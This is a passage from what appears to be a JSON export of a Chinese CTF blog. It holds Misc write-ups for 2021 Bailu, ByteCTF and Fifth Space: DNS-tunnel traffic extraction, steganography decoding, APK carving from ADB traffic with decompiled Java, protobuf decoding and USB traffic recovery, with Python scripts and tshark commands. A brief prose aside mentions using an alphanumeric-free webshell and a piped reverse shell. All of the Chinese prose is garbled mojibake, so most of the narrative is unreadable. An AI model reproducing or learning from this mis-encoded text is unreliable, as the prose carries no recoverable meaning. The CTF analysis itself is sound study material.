[26,45,16,56,17,8,20,38,12,72,42,3,6,10,62,12,59,3,38,51,45,4,14,41,13,41,43,22,54,12,42,33,51,8,16,43,31,3,54,12,33,15,59] r = '' for k, v in enumerate(s): r += chr(ord(v) ^ l[k]) print(r) # ntio{QAMK-awpoK_ahTDdFl_eoSb_cogpJZCVzbBNn} æ¥ç€å¯¹æ¯ä¸ªå­—æ¯å¾ªç¯ç§»ä½ä¸€ä¸‹å°±å®Œäº‹äº†ã€‚ï¼ˆç»å…¸å‡¯æ’’ flag{ISEC-sohgC_szLVvXd_wgKt_ugyhBRUNrtTFf} å°ç»“æ‘¸äº†ï¼Œè¿™ä¸ªæ¯”èµ›çš„å‰ä¸€å¤©åœ¨æ‰“å¼ºç½‘æ‹Ÿæ€é˜²å¾¡é‚£ä¸ªæ¯”èµ›ï¼Œä¸è¯´åˆ«çš„ï¼Œè¢« sb Misc é¢˜ç›®çš„ sb å‡ºé¢˜äººæŠ˜ç£¨äº†ä¸€æ™šä¸Šï¼Œéš¾å—æ­»äº†ã€‚ï¼ˆä½ æç€å’Œå’±ç©æ‹Ÿæ€å‘¢ ç„¶åå¯»æ€ç€ç¾¤å‹éƒ½åœ¨çœ‹ hackergameï¼Œå°±æ¥ç„äº†çœ¼ï¼Œæ°´äº†å‡ é¢˜åˆ°äº†ç¬¬37ï¼Œäºæ˜¯å¤©äº®äº†ã€‚ ç¡ä¸€è§‰èµ·æ¥å‘ç°é˜Ÿå‹ä¹Ÿæ‘¸äº†ï¼Œé‚£å°±ä½›ç³»çœ‹è¿™ä¸ªæ¯”èµ›äº†â€¦â€¦ äºæ˜¯ä¹ä¸€ä¸ªé˜Ÿå‹å…¨ç¨‹æ‘¸äº†ï¼Œå¦ä¸€ä¸ªé˜Ÿå‹è§£äº†åŠå¤© crypto éƒ½æ²¡è§£å‡ºæ¥ï¼Œä½›äº†ã€‚ ç„¶è€Œèµ›åå…¶ä»–å¸ˆå‚…è¯´å‰ä¸¤ä¸ª crypto éƒ½æ˜¯åŸé¢˜ã€‚ã€‚ è¿™æ¬¡å€’æ˜¯ç¬¬ä¸€æ¬¡çœ‹è¿™ç§åŠ å¯†çš„ pyc é€†å‘ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ã€‚ Misc å‰©ä¸‹çš„ä¸‰é“é¢˜å…¨æ˜¯ apkï¼Œè¦é€†å‘å†è§£ï¼Œä½›äº†ã€‚ è¿˜çœ‹äº†ä¸ª webï¼Œç„¶è€Œå–µå–µæ²¡æ‰“é€šã€‚è¿™æ˜¯ä¹‹å‰ä¸€ä¸ªæ¯”èµ›çš„åŸé¢˜æ”¹çš„ï¼Œç¬¬ä¸€æ­¥æ˜¯ä¸ª SSRFï¼Œå™¢ï¼Œå¯ä»¥å‚è€ƒ [LCTF]bestphpâ€™s revengeï¼Œæˆ–è€… LCTF2018-bestphp's revenge è¯¦ç»†é¢˜è§£ã€‚åªä¸è¿‡æŠŠå†…å±‚çš„ flag.php æ”¹æˆäº†ä»æœ¬åœ°è®¿é—®çš„æœ¨é©¬ï¼Œä¸”è¿‡æ»¤äº†å­—æ¯æ•°å­—ï¼Œæ‹¿æ— å­—æ¯æ•°å­— webshell æ‰“ä¸€ä¸‹å°±è¡Œã€‚ èµ›åå…¶ä»–å¸ˆå‚…è¯´è¿™é¢˜é¶æœºæ²¡æœ‰ bash nc è¿™äº›ï¼Œå¯ä»¥é€šè¿‡æ„é€ ç®¡é“æŠŠ shell å¼¹å‡ºæ¥ï¼Œæœ€åè¯» phpinfo ä¹‹ç±»çš„å¥½åƒã€‚ï¼ˆç¯å¢ƒå…³äº†ä¹Ÿå¤ç°ä¸äº†äº† æ€»ä¹‹å§ï¼Œé¢˜ç›®è¿˜æ˜¯æœ‰ç‚¹éš¾åº¦çš„ï¼Œä¸è¿‡å¯èƒ½æ˜¯è¿™å‘¨æ¯”èµ›å¤ªå¤šäº†ï¼Œæ‰“çš„å¸ˆå‚…ä¸ç®—å¤šã€‚å’±ä¹Ÿå°±æ‘¸æ‘¸é±¼çœ‹çœ‹é¢˜ç½¢äº†ã€‚ å°±è¿™æ ·å§ã€‚ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/10/25/CTF_2021bailu/"},{"title":"CTF | 2021 ByteCTF Misc Writeup","text":"å¼•è¨€ ç¬¬ä¸‰å±Šå­—èŠ‚è·³åŠ¨â€œå®‰å…¨èŒƒå„¿â€é«˜æ ¡æŒ‘æˆ˜èµ›æ­£å¼å¼€å¯ï¼Œèµ›äº‹ç”±å­—èŠ‚è·³åŠ¨å®‰å…¨ä¸é£æ§å›¢é˜Ÿå‘èµ·å¹¶ä¸»åŠï¼Œåˆ†ä¸ºByteCTFå’Œå®‰å…¨AIæŒ‘æˆ˜èµ›ä¸¤ä¸ªèµ›é“ï¼ŒåŒæ—¶æœ‰â€œå®‰å…¨èŒƒå„¿â€æ²™é¾™è¾…åŠ©å¼•é¢†ï¼Œå…¨é¢ä¿ƒè¿›é«˜æ ¡ç½‘ç»œå®‰å…¨æ–°åŠ›é‡çš„æŒ–æ˜ã€æå‡å’Œæ¿€åŠ±ã€‚ ByteCTF èµ›é“çš„æ¯”èµ›å½¢å¼ä¸ºCTFè§£é¢˜èµ›ï¼Œèµ›é¢˜åŒ…å«Webã€Pwnã€Reversingã€Cryptoã€Mobileã€Miscç­‰å¤šç§é¢˜å‹ï¼Œèµ›é¢˜ä¸å­—èŠ‚è·³åŠ¨äº§å“ä¸šåŠ¡ç›¸ç»“åˆï¼Œç»™åŒå­¦ä»¬è¥é€ å­—èŠ‚è·³åŠ¨æ”»é˜²åœºæ™¯çš„æ²‰æµ¸å¼ä½“éªŒã€‚ çº¿ä¸Šåˆèµ›æ—¶é—´ï¼š2021å¹´10æœˆ16æ—¥-17æ—¥ https://2021bytectf.xctf.org.cn/ å‘ç°å¥½ä¹…æ²¡æ°´åšå®¢äº†ï¼Œä¹‹å‰æœ‰å‡ ç¯‡å’•æ‰äº†ï¼Œå–µå–µè¦ä¸Šè¯¾è¦æ¬ç –å•Šï¼Œå–µå‘œâ€¦â€¦ å™¢ï¼Œè¿™å‘¨æœ« ByteCTF æ¥äº†ï¼Œé‚£å°±æ¥æ‘¸é±¼æ‰“ä¸€æ‰“å§ï¼ è¿™ç¯‡å°±å†™å‡ é¢˜ Misc æ–¹å‘çš„å§ï¼Œæœ‰çš„è¿˜æ˜¯èµ›åå¤ç°çš„ï¼Œè¿™æ¯”èµ›å¤ªé¡¶å•¦ï¼ Checkin å­—èŠ‚è·³åŠ¨å®‰å…¨ç³»åˆ—æ´»åŠ¨ä¸»é¢˜åå­—æ˜¯ä»€ä¹ˆï¼Ÿä½ é€ å—ï¼Ÿå…³æ³¨ã€å­—èŠ‚è·³åŠ¨å®‰å…¨ä¸­å¿ƒã€‘å…¬ä¼—å·å¹¶å›å¤æœ¬æ¬¡å¤§èµ›ä¸»é¢˜ï¼ˆ4å­—ï¼‰ï¼Œä¼šæœ‰æ„å¤–æƒŠå–œï¼ å‘ å®‰å…¨èŒƒå„¿ Surveyå¡«é—®å· HearingNotBelieving Hearing is not believing https://2021bytectf-g.xctf.org.cn/media/uploads/task/a1fe791c76c245279317da2230fdc639.zip è§£å‹å‡ºæ¥ä¸€ä¸ª wavï¼Œä¸€çœ‹é¢‘è°±ï¼Œå¾ˆæ˜æ˜¾å‰åŠæ®µæœ‰ä¸ªäºŒç»´ç ã€‚ æ‹¼æˆä¸€ä¸ªäºŒç»´ç ï¼Œç„¶åæ‰‹æ’¸ä¸€ä¸‹ m4yB3_ ååŠæ®µæ˜¯ SSTVï¼Œåˆæƒ³åˆ° å–µå–µæ–°å¹´è§£è°œé—¯å…³ å‡ºè¿‡ä¸€é¢˜åŒ…å« SSTV çš„äº†ï¼ˆ ä¸€å…±æœ‰å¥½å‡ å¼ å›¾ï¼Œæ‹¼æˆä¸€å¼ å›¾ï¼Œé‡Œé¢æœ‰ä¸ªäºŒç»´ç  ç„¶åå†æ‰‹æ’¸ä¸€ä¸‹â€¦â€¦ U_kn0W_S57V} å¾—åˆ° flag ByteCTF{m4yB3_U_kn0W_S57V} frequently Someone wants to send secret information through a surreptitious channel. Could you intercept their communications? https://2021bytectf-g.xctf.org.cn/media/uploads/task/27bf98ffacef41d6b605fe2534b0a2ab.zip ä¸€ä¸ªæµé‡åŒ… è¿™å † dns æŸ¥è¯¢çš„åŸŸåæ„Ÿè§‰æœ‰æˆ æ‰¾ä¸€ä¸‹å‘ç°.bytedanec.topçš„dnséš§é“æµé‡ã€‚ dns &amp;&amp; dns.qry.name contains \"bytedanec.top\" &amp;&amp; ip.src == 10.2.173.238 æœ‰æˆäº†ï¼ è¿™ä¸ªå¯¼å‡º json import base64 import json with open('dns.json', 'r', encoding='utf-8') as fin: s = fin.read() data_raw0 = json.loads(s) data_raw = sorted( data_raw0, key=lambda x: x['_source']['layers']['frame']['frame.time_epoch']) data_extract = '' for d in data_raw: queries = d['_source']['layers']['dns']['Queries'] for i in queries: x = queries[i][\"dns.qry.name\"].split('.')[0] print(x) if x not in 'io': data_extract += x print(data_extract) data_decode = base64.b64decode(data_extract) with open('decode.png', 'wb') as fout: fout.write(data_decode) ï¼ˆåæ¥å‘ç°è¿˜ä¸å¦‚ç›´æ¥å¯¼å‡º CSVï¼Œç„¶ååˆ é™¤å†—ä½™ä¿¡æ¯ï¼Œå¤åˆ¶ç²˜è´´åˆ° CyberChef å¤„ç†ã€‚ã€‚ ç„¶åå‘ç°æ”¹æ¥æ”¹å»éƒ½ä¸å¯¹ï¼Œè¿™è§£æå‡ºæ¥çš„ png å›¾ç‰‡æ€ä¹ˆéƒ½æ˜¯æŸåçš„ï¼Œè™½ç„¶è¯´å‹‰å¼ºèƒ½çœ‹åˆ°ç‚¹ä¸œè¥¿ï¼Œä½†æ„Ÿè§‰å“ªé‡Œé”…äº†å•Šâ€¦â€¦ åæ¥æ‰æƒ³åˆ°åº”è¯¥æ˜¯æœ‰ä¸¢åŒ…å¯¼è‡´é‡ä¼ ï¼Œæ‰€ä»¥æºåœ°å€ä¸ºå‘åŒ…æœºå™¨çš„æ—¶å€™å¯èƒ½ä¼šå­˜åœ¨å†—ä½™çš„ï¼Œé‚£å°±æ¢æˆ 8.8.8.8 è¿”å›çš„å°±å¥½äº†å§ã€‚ dns &amp;&amp; dns.qry.name contains \"bytedanec.top\" &amp;&amp; ip.src == 8.8.8.8 å‡ºæ¥ä¹Ÿä¸å¤§å¯¹åŠ²ï¼Œä½†èƒ½å¤§æ¦‚çœ‹åˆ°è¯´ You find the DNS tunnel. ç„¶åé˜Ÿå‹è¯´å»é‡ä¹‹åå‡ºäº†æ­£å¸¸çš„å›¾â€¦â€¦ å°±æ˜¯æ¯”å¦‚è¿™ç§ Transaction ID ç›¸åŒçš„ï¼Œå¾ˆæ˜æ˜¾æ˜¯é‡å¤çš„äº†ã€‚ æˆ–è€…ä¹Ÿå¯ä»¥æ‹¿ tshark å¯¼å‡ºï¼Œç„¶ååŒ¹é…å­—ç¬¦ä¸²æ¥å¤„ç† tshark -T fields -r frequently.pcap -e dns.qry.name -e dns.id &gt; 1.txt è§‚å¯Ÿå‘ç°base64ç¼–ç çš„æ•°æ®è¿”å›çš„aè®°å½•éƒ½æ˜¯10.0.0.1ï¼Œoå’Œiçš„è¿”å›aè®°å½•éƒ½æ˜¯10.0.0.2ã€‚ å•ç‹¬çœ‹ i o æå–o iï¼Œå‘ç°åˆšå¥½ä¸º 360 ä¸ªï¼Œè½¬ä¸º 01 ç„¶åè½¬ ascii å¾—åˆ°å‰åŠæ®µ flag dns &amp;&amp; dns.qry.name matches \"^[io].bytedanec.top\" &amp;&amp; ip.src == 8.8.8.8 The first part of flag: ByteCTF{^_^enJ0y&amp;y0ur ååŠæ®µ udp.stream eq 1 å¾—åˆ°å¦ä¸€åŠ flag æœ€åå¾—åˆ° ByteCTF{^_^enJ0y&amp;y0urse1f_wIth_m1sc^_^} Lost Excel Please find out who leaked this document asap https://2021bytectf-g.xctf.org.cn/media/uploads/task/41f3f4157b1a43ebb7baf662fc9b5604.zip HInt: Block size = 8. Notice repeating patterns. Excel é‡Œçš„è¿™ä¸ªèƒŒæ™¯å›¾ç‰‡æœ‰çŒ«è…»ã€‚ LSB æœ‰å¥‡å¥‡æ€ªæ€ªçš„éšå†™ã€‚ R0 G0 B0 éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæå–ä¸€ä»½å‡ºæ¥ã€‚ æ¯ä¸ªæ–¹å—å  4*4 pixelï¼Œå¾ˆæ˜æ˜¾å›¾é‡Œçš„ä¿¡æ¯æ˜¯å†—ä½™çš„ï¼Œæˆ–è€…è¯´æ˜¯æœ‰å¤§é‡ç›¸åŒè§„å¾‹é‡å¤çš„è‰²å—ã€‚ æ¯”èµ›çš„æ—¶å€™ç›²çŒœè¿™æ˜¯ 0 1 äºŒè¿›åˆ¶ç¼–ç ï¼Œç„¶è€Œå¯¼å‡ºæ¥å‘ç°å•¥ä¹Ÿä¸æ˜¯ã€‚ åæ¥å’±éƒ½æƒ³ä¸å‡ºæ¥è¿™æ˜¯å•¥äº†â€¦â€¦ èµ›åé—®äº†å…¶ä»–å¸ˆå‚…ï¼Œè¯´æ˜¯å››è¿›åˆ¶ç¼–ç ï¼Œç»äº†ã€‚éš¾é“ä»–æ¯ä¸ªæ–¹å—å  4*4 pixel æœ‰è¿™ä¸ªæç¤ºä½œç”¨å—ï¼ˆ å™¢ï¼ŒBlock size = 8 æŒ‡çš„æ˜¯ 8pixel å•Šï¼ ä¹Ÿå°±æ˜¯è¯´ç±»ä¼¼äºä¸‹é¢è¿™æ ·ï¼Œ8*8pixel ä½œä¸ºä¸€ä¸ªå°æ ¼å­ï¼Œæ¯ä¸ªæ ¼å­é‡Œåªå­˜åœ¨5ç§æƒ…å†µï¼š å…¨ç©º å·¦ä¸Šä¸€ä¸ª =&gt; 00 å³ä¸Šä¸€ä¸ª =&gt; 01 å·¦ä¸‹ä¸€ä¸ª =&gt; 10 å³ä¸‹ä¸€ä¸ª =&gt; 11 æ ¹æ®ä½ç½®æŒ‰ç…§å››è¿›åˆ¶è¿›è¡Œç¼–ç ã€‚ Exp: è¿™é‡Œè¯•äº†è¯•å‘ç°å¾—æŒ‰ç…§ä»å·¦åˆ°å³å…ˆè¯»ç¬¬ä¸€è¡Œï¼Œç„¶åå†ä»ä¸Šåˆ°ä¸‹è¯»ç¬¬äºŒè¡Œè¿™æ ·ã€‚ from Crypto.Util.number import long_to_bytes import numpy as np import matplotlib.pyplot as plt from PIL import Image img = Image.open('red0.png') # img.show() img.size # (615, 607) data = [] result = '' for j in range(0, img.size[1], 8): for i in range(0, img.size[0], 8): pixels = [img.getpixel((i, j)), img.getpixel( (i+4, j)), img.getpixel((i, j+4)), img.getpixel((i+4, j+4))] # print(pixels) s = ''.join([str(x[0]//255) for x in pixels]) # '0010'.index('1') ==&gt; 2 if '1' in s: idx = s.index('1') result += str(idx) data.append(s) # print(data) print() print(result) print(long_to_bytes(int(result, 4))) ByteCTF{ExcelHiddenWM} BabyShark https://2021bytectf-g.xctf.org.cn/media/uploads/task/cb5a835747374f52920e5878de657406.zip ï¼ˆè¿™é¢˜å–µå–µçœ‹äº†çœ‹ä¸ä¼šåšï¼Œèµ›åæ¥å¤ç°ä¸€ä¸‹ åˆæ˜¯ä¸ªæµé‡åŒ…ï¼Œåˆšå¼€å§‹çœ‹è¿™ä¸€å † Windowsupdateï¼Œç›²çŒœè¿™å † url ç¼–ç é‡Œé¢è—ç€å•¥ä¸œè¥¿ã€‚ ä½†é˜Ÿå‹è¯•äº†å‘ç°æ²¡å•¥ä¸œè¥¿ã€‚ åæ¥å‘ç° tcp.stream eq 0 æ˜¯ä¸€ä¸ª adb install xxx.apk çš„æµé‡ï¼Œå¯ä»¥æŠŠ apk æŠ å‡ºæ¥ã€‚ æ ¹æ® ADB çš„æ•°æ®åŒ…æ ¼å¼ï¼Œéœ€è¦æŠŠ WRTE ç›¸å…³çš„éƒ¨åˆ†ç»™å»é™¤æ‰ã€‚ å¦å¤–ä¹Ÿæ‰¾åˆ°äº† ACTF Misc300 æŠ“åŒ… ä¸€é“é¢˜å’Œè¿™éƒ¨åˆ†æ¯”è¾ƒç±»ä¼¼ï¼Œä¸‹é¢æ˜¯ä»–çš„å®˜æ–¹ wpï¼š https://blog.flanker017.me/wp-content/uploads/2014/04/misc300-official-writeup.pdf ä¹Ÿå¯ä»¥å‚è€ƒ ADB Protocol Documentation (Better documentation of the ADB protocol, specifically for USB uses.) æ€»ä¹‹å°±æ˜¯è¦å»æ‰è¿™ 24bytes çš„æ•°æ®ï¼Œæå– payload éƒ¨åˆ†ã€‚ ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥è¯•è¯•ä¸Šé¢ wp é‡Œçš„è„šæœ¬ è™½ç„¶æ–‡ä»¶å¯èƒ½è¿˜æœ‰ç‚¹é—®é¢˜ï¼Œä½†ä¹Ÿèƒ½æŠŠè¿™ä¸ª dex ç»™è§£å‹å‡ºæ¥äº†ã€‚ ç„¶åç›´æ¥è¿›è¡Œä¸€ä¸ªé€†å‘ã€‚ package com.bytectf.misc1; import android.os.Build.VERSION; import android.os.Bundle; import android.os.Environment; import android.os.StrictMode; import android.os.StrictMode.ThreadPolicy.Builder; import androidx.appcompat.app.AppCompatActivity; import androidx.core.app.ActivityCompat; import dalvik.system.DexClassLoader; import java.io.File; import java.io.IOException; import java.lang.reflect.Method; import okhttp3.Call; import okhttp3.OkHttpClient; import okhttp3.Request; import okhttp3.Request.Builder; import okhttp3.Response; import okhttp3.ResponseBody; public class MainActivity extends AppCompatActivity { public long getAESKey(byte[] paramArrayOfByte, Method paramMethod) { try { paramArrayOfByte = paramMethod.invoke(null, new Object[] { paramArrayOfByte }); long l = ((Long)paramArrayOfByte.getClass().getMethod(\"getKey\", new Class[0]).invoke(paramArrayOfByte, new Object[0])).longValue(); return l; } catch (Exception paramArrayOfByte) { paramArrayOfByte.printStackTrace(); } return -1L; } public String getPBClass() { String str = \"\"; if (ActivityCompat.checkSelfPermission(this, \"android.permission.READ_EXTERNAL_STORAGE\") != 0) { ActivityCompat.requestPermissions(this, new String[] { \"android.permission.READ_EXTERNAL_STORAGE\" }, 1); } else if (ActivityCompat.checkSelfPermission(this, \"android.permission.WRITE_EXTERNAL_STORAGE\") != 0) { ActivityCompat.requestPermissions(this, new String[] { \"android.permission.WRITE_EXTERNAL_STORAGE\" }, 1); } else if (Environment.getExternalStorageState().equals(\"mounted\")) { str = Environment.getExternalStorageDirectory().getAbsolutePath() + \"/PBClass.dex\"; } return str; } public byte[] getPBResp() { Object localObject1 = new byte[0]; OkHttpClient localOkHttpClient = new OkHttpClient(); Object localObject2 = new Request.Builder().url(\"http://192.168.2.247:5000/api\").build(); try { localObject2 = localOkHttpClient.newCall((Request)localObject2).execute().body().bytes(); localObject1 = localObject2; } catch (IOException localIOException) { localIOException.printStackTrace(); } return (byte[])localObject1; } public Class loadPBClass(String paramString) { File localFile = getDir(\"dex\", 0); paramString = new DexClassLoader(new File(paramString).getAbsolutePath(), localFile.getAbsolutePath(), null, getClassLoader()); try { paramString = paramString.loadClass(\"com.bytectf.misc1.KeyPB\").getClasses()[0]; return paramString; } catch (Exception paramString) { paramString.printStackTrace(); } return null; } protected void onCreate(Bundle paramBundle) { super.onCreate(paramBundle); setContentView(2131427356); if (Build.VERSION.SDK_INT &gt; 9) { StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build()); } paramBundle = loadPBClass(getPBClass()).getMethods()[37]; AesUtil.decrypt(getAESKey(getPBResp(), paramBundle), \"8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1\"); } } å¤§æ¦‚çš„é€»è¾‘æ˜¯ï¼š ä» Environment.getExternalStorageDirectory().getAbsolutePath() + \"/PBClass.dex\" è¿™ä¸ªæ–‡ä»¶é‡ŒåŠ è½½ç±» loadClass(\"com.bytectf.misc1.KeyPB\") è¯·æ±‚ http://192.168.2.247:5000/api è¿™ä¸ªæ¥å£ï¼Œè·å¾—ä¸€æ®µ bytes åˆ©ç”¨è¿™æ®µ bytesï¼Œç»“åˆè¿™ä¸ªç±»é‡Œçš„æ–¹æ³•è¿›è¡Œä¸€äº›å¤„ç†ï¼Œè·å¾— AES Keyï¼ˆgetAESKey å‡½æ•°ï¼‰ åˆ©ç”¨ AES Key è§£å¯† 8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1 äºæ˜¯æœ€åçš„ç»“æœåº”è¯¥å°±æ˜¯ flag äº†ã€‚ é‚£ç°åœ¨å°±å»æ‰¾è¿™æ®µ bytesï¼Œç›´æ¥çœ‹æµé‡é‡Œçš„ /api éƒ¨åˆ†å°±å®Œäº‹äº†ã€‚ 088bb7bdf5dbd53711a1f831e6d61cc840 å…¶å®å½“æ—¶é˜Ÿå‹å·²ç»åšåˆ°è¿™é‡Œäº†ï¼Œç„¶è€Œå¹¶ä¸çŸ¥é“è¿™ä¸ª PB æ˜¯å•¥ç©æ„ã€‚ã€‚ èµ›åæ‰çŸ¥é“æ˜¯ protobufï¼Œçœ‹äººå®¶é˜Ÿä¼ç»å…¸ fuzzâ€¦â€¦ï¼ˆæ‘Šæ‰‹ åˆæƒ³åˆ°äº† CISCN 2021 åˆèµ›çš„ tiny traffic é‚£é¢˜ï¼Œä¹Ÿæ¥è§¦äº† protobuf ç„¶åä¸¢å» èµ›åšå¨å­ è§£å¯†ä¸€ä¸‹ å¾—åˆ°ä¿©æ•°å­— { \"1\": 244837809871755, \"2\": 11671133301835090000 } æ ¹æ®æºç å¯ä»¥çœ‹å‡ºè¿™ä¸ªå°±æ˜¯ AesUtil.decrypt å‡½æ•°çš„å‚æ•° paramLongï¼Œäºæ˜¯åº”è¯¥å–çš„æ˜¯ 244837809871755ã€‚ å¦å¤–å‚è€ƒå®˜æ–¹ wpï¼Œä¹Ÿå¯ä»¥ç”¨ python åº“blackboxprotobufè¿›è¡Œè§£æã€‚ data = b'\\x08\\x8b\\xb7\\xbd\\xf5\\xdb\\xd5\\x37\\x11\\xa1\\xf8\\x31\\xe6\\xd6\\x1c\\xc8\\x40' blackboxprotobuf.decode_message(data) &gt;&gt;&gt; ({'1': 244837809871755, '2': 4668012723080132769}, {'1': {'type': 'int', 'name': ''}, '2': {'type': 'fixed64', 'name': ''}}) ç„¶åå›å»è§£å¯†å°±å®Œäº‹äº†ã€‚ AES/CFB/NoPadding ï¼ˆå¯æ¶ï¼Œæ€ä¹ˆä½ ä»¬éƒ½ä¼š Java å•Šï¼Œå‘œå‘œå‘œ import com.bytectf.misc1.AesUtil; public class exp { public static void main(final String[] args) { final String flag = AesUtil.decrypt(244837809871755L, \"8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1\"); System.out.println(flag); } } å°±è¿™æ ·å§ï¼ˆ å°ç»“å­—èŠ‚å’Œå¿ƒè„åªæœ‰ä¸€ä¸ªèƒ½è·³åŠ¨ï¼ˆ å¤ªé¡¶äº†å•Šï¼ æœ‰æ„æ€çš„æ˜¯å‘¨å…­å»ç»™æ–°ç”Ÿåš CTF å®£è®²ï¼Œå–µå–µç°åœºå°±åœ¨çœ‹è¿™ä¸ª CTFï¼Œ23333ã€‚ æœ€åå–µå–µè¢«é˜Ÿå‹å¸¦é£ï¼Œå’±è¿›å‰åäº†å•Šï¼ çœ‹å’±æœ‰æ²¡æœ‰æœºä¼šå»çº¿ä¸‹å†³èµ›æ—…æ¸¸äº† ï¼ˆçº¿ä¸‹æ¨è¿Ÿäº†ï¼Œç–«æƒ…å¥½çƒ¦å•Šï¼Œå–µå‘œå‘œ å®˜æ–¹ writeup ä¹Ÿå‡ºæ¥äº†ï¼Œå¥½è€¶ï¼ 2021 ByteCTF åˆèµ›éƒ¨åˆ†é¢˜ç›®å®˜æ–¹Writeup å¯æ¶çš„éƒ¨åˆ† wpï¼Œç”±äºçº¿ä¸‹èµ›è¿˜æœ‰æ‰€ä»¥åˆèµ›è¿™é‡Œä¸æ”¾ wp äº†ï¼Ÿï¼Ÿï¼Ÿ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/10/19/CTF_2021ByteCTF/"},{"title":"CTF | 2021 ç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›çº¿ä¸Šèµ› Misc WriteUp","text":"å¼•è¨€ 2021 ç¬¬ä¸‰å±Šâ€œç¬¬äº”ç©ºé—´â€ç½‘ç»œå®‰å…¨å¤§èµ› æ¯”èµ›æ—¶é—´ï¼š2021-09-16 09:00 ~ 2021-09-16 21:00 https://5space.360.net/ å–µå‘œï¼Œè¦ä¸Šè¯¾å•Šï¼Œçƒ¦çƒ¦ï¼Œåªèƒ½åœ¨ä¸Šè¯¾å’Œæ¬ç –çš„é—²æš‡æ—¶é—´æ‘¸é±¼æ‰“æ‰“æ¯”èµ›äº†ã€‚ è¿™ä¸ª ç¬¬äº”ç©ºé—´ CTF æ¯”èµ›æ—¶é—´è¿˜å®‰æ’åœ¨å‘¨å››ï¼Œä¸æ˜¯å‘¨æœ«ï¼Œçœ‹äº†çœ¼ Web å‘ç°å·²ç»è¢«é˜Ÿå‹ AK äº†ï¼Œåªèƒ½éšæ„çœ‹çœ‹ Misc é¢˜å¥½äº†ã€‚ è²Œä¼¼å¥½ä¹…æ²¡æ°´æ–‡ç« äº†ï¼Œé‚£è¿™å°±æ˜¯ä¸€ç¯‡æ°´æ–‡ï¼Œåªæœ‰ä¸‰é“ Miscï¼Œå¤§å®¶éšæ„çœ‹çœ‹å°±å®Œäº‹äº†ã€‚ Miscç­¾åˆ°é¢˜flag{welcometo5space} alpha10foremost æå–å‡ºæ¥ä¸¤å¼ å›¾ç‰‡ png æ˜æ˜¾æ¯” jpg å¤šäº†äº›å™ªå£°ï¼Œsub çœ‹ä¸€ä¸‹ ç»“åˆé¢˜ç›®åå­— alpha10 çŒœæƒ³æ˜¯ç›²æ°´å°ï¼Œalpha æ˜¯å‚æ•°ã€‚ ç„¶ååˆæƒ³èµ· å–µå–µçš„ç‰›å¹´è§£è°œé—¯å…³ å°±å‡ºè¿‡ä¸€é¢˜ç›²æ°´å°çš„ï¼ˆ è¯•äº†å‘ç°æ˜¯ chishaxie çš„ BlindWaterMark python3 bwmforpy3.py decode 00001404.jpg 00001537.png 1.png --alpha 10 æ°´å°é‡Œå°±æ˜¯ flag flag{XqAe3QzK2ehD5fWv8jfBitPqHUw0} BabyMiç»™äº†ä¸ª USB æµé‡ï¼Œçœ‹ä¸Šå»é‡Œé¢åŒ…å«æœ‰æ–‡ä»¶ä¼ è¾“ å…ˆç”¨ tshark å¯¼å‡ºæµé‡æ•°æ® tshark -r usb.pcap -T fields -e usb.capdata &gt; data.txt ç„¶åå†™ä¸ªè„šæœ¬æŠŠé‡Œé¢çš„éç©º éå…¨é›¶ ï¼ˆåæ¥è§‰å¾—å¥½åƒæ²¡å¿…è¦ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼‰ å­—ç¬¦ä¸² unhex ä¸€ä¸‹ï¼Œåˆå¹¶ä¸ºä¸€ä¸ªæ–‡ä»¶ã€‚ from binascii import unhexlify cnt = 1 with open('data.txt', 'r', encoding='utf-8') as f: while True: line = f.readline() if not line: break line = line.strip() if len(line) &lt;= 1: continue for i in line: if i != b'\\x00': break else: continue d = unhexlify(line) # print(d) with open(f'total.dat', 'ab') as fout: fout.write(d) print(cnt) cnt += 1 æ‹¿ diskgenius æ¢å¤ä¸€ä¸‹æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ª mp4ï¼Œæ’­æ”¾å°±å‘ç°é‡Œé¢è¾“å…¥äº† flag flag{A good hacker do not need any mi?} å°ç»“å–µå‘œå‘œå‘œï¼Œå…¶å®å°±åšäº†ä¿© Miscï¼Œç­¾åˆ°é¢˜è¿˜è¢«é˜Ÿå‹æŠ¢äº†ï¼ˆx å¿ƒå¾—å°±æ˜¯ï¼šä¸Šè¯¾ï¼Œä¸‹è¯¾ï¼Œæ¥åˆ°å®éªŒå®¤ï¼Œæ‰“å¼€ç”µè„‘åšäº†ä¸€é¢˜ Miscï¼Œåƒé¥­ï¼Œä¸Šè¯¾ï¼Œä¸‹è¯¾ï¼Œå›å®¿èˆï¼Œæ‰“å¼€ç”µè„‘åšäº†å¦ä¸€é¢˜ Miscã€‚ ï¼ˆå¥½çƒ¦å•Šè¿˜è¦ä¸Šè¯¾ åˆæ˜¯ä¸ªå·å·å·çš„æ¯”èµ›ï¼Œè¿™æ¬¡å€’æ˜¯å¤šäº†å‡ ä¸ªå¥‡æ€ªåˆ†åŒºçš„é¢˜ç›®ï¼Œæ¯”å¦‚ äº‘å®‰å…¨ã€ä¸ªäººä¿¡æ¯ä¿æŠ¤ã€äººå·¥æ™ºèƒ½ï¼Œbalabalaï¼Œä½†å…¶å®æ„Ÿè§‰å¥½å¤šè¿˜æ˜¯å’Œ crypto æœ‰å…³çš„ï¼Œå–µå–µä¸ä¼šå•Šã€‚ï¼ˆæ‘Šæ‰‹.gif æœ€åå’Œé˜Ÿå‹ä¸€èµ·æ‰“åˆ°äº†æ€»æ¦œç¬¬39ï¼Œç¤¾ä¼ç»„ç¬¬11ï¼Œè¿›å†³èµ›äº†å–µ~ é˜Ÿå‹ tqlï¼æ„Ÿè°¢é˜Ÿå‹å¸¦é£ï¼ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/09/18/CTF_2021_5space/"},{"title":"CTF | 2021 ç¥¥äº‘æ¯ Misc WriteUp","text":"å¼•è¨€ 2021 